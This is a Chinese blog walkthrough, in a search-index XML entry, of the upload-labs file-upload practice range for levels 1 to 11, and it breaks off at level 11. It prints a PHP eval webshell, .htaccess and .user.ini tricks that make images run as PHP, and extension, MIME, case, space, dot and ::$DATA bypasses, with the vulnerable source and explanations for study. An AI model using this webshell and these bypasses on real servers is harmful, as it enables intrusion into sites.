<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>upload-labs全详解</title>
      <link href="/2025/05/12/upload-labs%E5%85%A8%E8%AF%A6%E8%A7%A3/"/>
      <url>/2025/05/12/upload-labs%E5%85%A8%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="upload-1（扩展名）"><a href="#upload-1（扩展名）" class="headerlink" title="upload-1（扩展名）"></a>upload-1（扩展名）</h1><p>直接上传一句话木马</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505061622862.png" alt="image-20250506162226800"></p><p>可知被<code>js</code>拦截了</p><p>这里存在两种解法</p><p>一.直接在浏览器中禁用<code>js</code></p><p>二.将文件名更改为<code>cj.png</code>，上传抓包，在重放中将文件后缀名更改为<code>cj.php</code>,再进行发包。</p><p>返回靶场的页面，复制上传的文件的链接，打开蚁剑，输入上面复制的链接打开蚁剑，粘贴网址，输入密码</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505061637236.png" alt="image-20250506163758185"></p><p>核心的源码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var allow_ext = &quot;.jpg|.png|.gif&quot;;</span><br><span class="line">    //提取上传文件的类型</span><br><span class="line">    var ext_name = file.substring(file.lastIndexOf(&quot;.&quot;));</span><br><span class="line">    //判断上传文件类型是否允许上传</span><br><span class="line">    if (allow_ext.indexOf(ext_name + &quot;|&quot;) == -1) &#123;</span><br><span class="line">        var errMsg = &quot;该文件不允许上传，请上传&quot; + allow_ext + &quot;类型的文件,当前文件类型为：&quot; + ext_name;</span><br><span class="line">        alert(errMsg);</span><br><span class="line">        return false;</span><br></pre></td></tr></table></figure><p>源码的作用是截取点号之后的文件名，精确匹配上面的允许上传的文件名。</p><p><strong>能进行绕过的原因是：</strong></p><p>这段源码仅仅通过<code>js</code>前端检查了文件名的后缀，而不检查真实的文件类型（如通过文件头Magic Number或者是MINE Type判断），所以只需要抓包使<code>js</code>的前端验证通过就可以</p><h1 id="upload-2（mime类型校验）"><a href="#upload-2（mime类型校验）" class="headerlink" title="upload-2（mime类型校验）"></a>upload-2（mime类型校验）</h1><p>上传一个一句话木马的<code>php</code>文件</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505061652411.png" alt="image-20250506165212363"></p><p>同样上传<code>php</code>一句话的同时进行抓包拦截，修改请求包的Content-Type为图片类型（<code>image/jpeg</code>）即可</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505061656556.png" alt="image-20250506165616523"></p><p>放行数据包，重复上面的操作</p><p>核心源码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;)) &#123;</span><br><span class="line">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $img_path = UPLOAD_PATH . &#x27;/&#x27; . $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]</span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $msg = &#x27;文件类型不正确，请重新上传！&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.&#x27;文件夹不存在,请手工创建！&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据源码判断，这里的漏洞类型是<strong>MIME 类型校验漏洞</strong>，攻击者可以通过抓包修改 <code>Content-Type</code> 来绕过检查。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/jpeg&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/png&#x27;) || ($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;] == &#x27;image/gif&#x27;))</span><br></pre></td></tr></table></figure><p>上面的代码仅仅检查的是来自HTTP请求头的Content-Type的值，同样没有对文件的真实类型进行判断。</p><h1 id="upload-3（Apache服务器特性）"><a href="#upload-3（Apache服务器特性）" class="headerlink" title="upload-3（Apache服务器特性）"></a>upload-3（Apache服务器特性）</h1><p>将文件后缀名更改为<code>php3，php5，phtml</code>可以绕过。</p><p>核心源码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = array(&#x27;.asp&#x27;,&#x27;.aspx&#x27;,&#x27;.php&#x27;,&#x27;.jsp&#x27;);</span><br><span class="line"> $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line"> $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">$file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line"> $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">$file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class="line"> $file_ext = trim($file_ext); //收尾去空</span><br></pre></td></tr></table></figure><p>上面进行了一系列的过滤，防止通过点号，空格，大小写等方法绕过达到上传恶意文件的作用。但是这里并没有过滤<code>php3，php5，phtml</code>这些文件后缀名，<strong>能这样绕过的条件：</strong></p><p>Apache服务器支持解析 <code>.php3 .php5 .phtml</code>后缀名的文件，但是需要在Apache的配置文件（<code>httpd.conf</code>或者是<code>apache2.conf</code>）中添加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .php .phtml .php3 .php5</span><br></pre></td></tr></table></figure><p>这样这些文件扩展名就能够被当作<code>php</code>脚本处理了，当然这里还有一个条件是靶场的搭建利用到了Apache服务器。</p><h1 id="upload-4-staccess文件"><a href="#upload-4-staccess文件" class="headerlink" title="upload-4(.staccess文件)"></a>upload-4(<code>.staccess</code>文件)</h1><p>核心源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.ini&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //收尾去空</span><br></pre></td></tr></table></figure><p>上面的源码过滤了许多文件的扩展名，包括过滤了点号，空格，大小写的绕过方法，这里可以看到文件后缀名.htaccess没有过滤掉</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.htaccess是一个纯文本文件，其中储存着Apache相关的命令</span><br><span class="line">.htaccess主要的作用：URL重写，404页面自定义，改变文件的扩展名，允许或者阻止特定的用户或者目录</span><br><span class="line">进行访问。</span><br><span class="line">.htaccess只针对当前目录才会起作用。</span><br><span class="line">.haaccess改变文件扩展名的用法：</span><br><span class="line">&lt;FilesMatch &quot;4.png&quot;&gt;</span><br><span class="line"> SetHandler application/x-httpd-php</span><br><span class="line"> &lt;/FilesMatch&gt;</span><br><span class="line">（如果当前目录下面由名字为4.png的文件就会被解析为.php的文件）</span><br></pre></td></tr></table></figure><p>下面是我创建的.staccess文件的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.jpg&quot;&gt;</span><br><span class="line"> SetHandler application/x-httpd-php</span><br><span class="line"> &lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>上面这串代码的作用是：<br>通过 <code>SetHandler</code> 指令，<strong>劫持 <code>.jpg</code> 文件的处理方式</strong>，让它们被 <code>PHP</code> 引擎解析。<strong>强制让所有 <code>.jpg</code> 文件被 Apache 当作 <code>PHP</code> 脚本解析并执行</strong>。</p><p>接着就将存储一句话木马的<code>php</code>的文件扩展名更改为<code>.jpg</code></p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505071600961.png" alt="image-20250507155953858"></p><p>先上传<code>.staccess</code>文件接着上传<code>cj.jpg</code>文件，复制上传的图片文件的路径，连接蚁剑</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505071603909.png" alt="image-20250507160315872"></p><h1 id="upload-5-user-ini文件"><a href="#upload-5-user-ini文件" class="headerlink" title="upload-5(.user.ini文件)"></a>upload-5(<code>.user.ini</code>文件)</h1><p>观察第五关的关键源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.j</span><br><span class="line">Html&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;)</span><br></pre></td></tr></table></figure><p>发现对比上一关，这里.htaccess文件也被拉入了黑名单，但是没有禁用.ini文件。 php.ini 是 php的配置文件，.user.ini（相当于一个用户自己定义的php.ini文件） 中的字段也会被 php  视为配置文件来处理，从而导致 php 的文件解析漏洞。</p><p>要触发**<code>.user.ini</code>文件的内容满足下面的条件**</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">服务器脚本语言为PHP</span><br><span class="line">服务器使用CGI／FastCGI模式 （两种通用网关接口，用于HTTP服务器与其他机器的程序服务通信交流）</span><br><span class="line">上传目录下要有可执行的php文件</span><br></pre></td></tr></table></figure><p>靶场的Apache服务器满足上面的两种条件</p><p>接下来创建一个<code>.user.ini</code>文件上传，<strong>文件的内容如下：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=cj.jpg</span><br><span class="line">作用：</span><br><span class="line">表示在每个php脚本执行之前，php会加载并且执行cj.jpg文件，即使是一个图片文件 php也会尝试将</span><br><span class="line">其作为php代码解析(如果文件的内容包含有效的php代码的话)</span><br></pre></td></tr></table></figure><p>接下来直接上传<code>cj.jpg</code>文件，等待五分钟之后右键图片复制连接蚁剑</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505071739252.png" alt="image-20250507173908190"></p><h1 id="upload-6-大小写绕过"><a href="#upload-6-大小写绕过" class="headerlink" title="upload-6(大小写绕过)"></a>upload-6(大小写绕过)</h1><p>源码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //首尾去空</span><br></pre></td></tr></table></figure><p>可以看到源码中不存在**<code>strtolower()</code>**函数，这个函数的作用是将字符串中的所有字符串转化为小写。</p><p>所以这里可以通过大小写绕过，及那个文件后缀名更改为<code>cj.Php</code></p><p><strong>能通过大小写绕过的原理：</strong></p><p>在Windows系统上面，文件名默认不区分大小写。</p><h1 id="upload-7-空格绕过"><a href="#upload-7-空格绕过" class="headerlink" title="upload-7(空格绕过)"></a>upload-7(空格绕过)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);</span><br><span class="line">        $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br></pre></td></tr></table></figure><p>这里没有<strong>trim()<strong>函数，这个函数的作用是</strong>去除字符串首尾的空白字符或其他指定字符</strong></p><p>直接上传<code>php</code>文件使用<code>yakit</code>进行拦截抓包</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505072015886.png" alt="image-20250507201506814"></p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505072015333.png" alt="image-20250507201517303"></p><p>在文件名后面加上空格发包，响应包中找到上传的图片的链接</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505072017395.png" alt="image-20250507201742360"></p><p>使用蚁剑进行连接</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505072018857.png" alt="image-20250507201836809"></p><p><strong>绕过的原理：</strong></p><p>在Windows系统中默认自动忽略文件名末尾的空格，cj.php和cj.php 会被视为同一文件。</p><h1 id="upload-8-点号绕过"><a href="#upload-8-点号绕过" class="headerlink" title="upload-8(点号绕过)"></a>upload-8(点号绕过)</h1><p>关键源码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//去除字符串::$DATA</span><br><span class="line">        $file_ext = trim($file_ext); //首尾去空</span><br></pre></td></tr></table></figure><p><code>strrchr()</code>函数的作用是<strong>查找字符串中最后一次出现某个字符的位置，并返回从该字符到字符串末尾的子串</strong>。</p><p>这里利用<code>strrchr()</code>函数的特性进行绕过，<strong>当文件包含多个点的时候，<code>strrchr()</code>返回的是最后一个点之后的内容（如果最后一个点为空就返回“.”）</strong></p><p>上传正常的<code>php</code>一句话木马的文件，抓包，在请求包文件的扩展名后面加上一个点号，再发包就可以连接蚁剑。</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505080019092.png" alt="image-20250508001920991"></p><p><strong>能够绕过的原理：</strong></p><p>Windows存储文件的时候会自动删除文件末尾的点号，cj.php.实际保存为cj.php</p><h1 id="upload-9-DATA绕过"><a href="#upload-9-DATA绕过" class="headerlink" title="upload-9(::DATA绕过)"></a>upload-9(::DATA绕过)</h1><p>关键源码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;,&quot;.ini&quot;);</span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = deldot($file_name);//删除文件名末尾的点</span><br><span class="line">        $file_ext = strrchr($file_name, &#x27;.&#x27;);</span><br><span class="line">        $file_ext = strtolower($file_ext); //转换为小写</span><br><span class="line">        $file_ext = trim($file_ext); //首尾去空</span><br></pre></td></tr></table></figure><p>观察源码可知没有对::DATA进行处理，可以使用::DATA进行绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">可以绕过的原理：</span><br><span class="line">php在Windows的时候如果在文件名之后加上::DATA会将之后的数据当作文件流进行处理，不会再检查文件的后缀名，而且可以保持::DATA之前的文件名</span><br></pre></td></tr></table></figure><p>上传文件使用yakit进行拦截，将png的文件后缀名更改为.php:DATA然后放行可以发现文件上传成功</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505080036317.png" alt="image-20250508003650268"></p><p>连接蚁剑即可</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505080037248.png" alt="image-20250508003705204"></p><h1 id="upload-10（与第6关相同）"><a href="#upload-10（与第6关相同）" class="headerlink" title="upload-10（与第6关相同）"></a>upload-10（与第6关相同）</h1><h1 id="upload-11-双写绕过"><a href="#upload-11-双写绕过" class="headerlink" title="upload-11(双写绕过)"></a>upload-11(双写绕过)</h1><p>关键源码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;,&quot;ini&quot;);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</span><br><span class="line">        $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">        $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;</span><br></pre></td></tr></table></figure><p>查看本关的提示可以发现</p><p><img src="https://ycycyccc.oss-cn-chengdu.aliyuncs.com/D:/%E5%9B%BE%E5%BA%8A%E4%BB%93%E5%BA%93/202505081055527.png" alt="image-20250508105529364"></p><p>对应源码的关键函数是：<code>str_ireplace($deny_ext,&quot;&quot;, 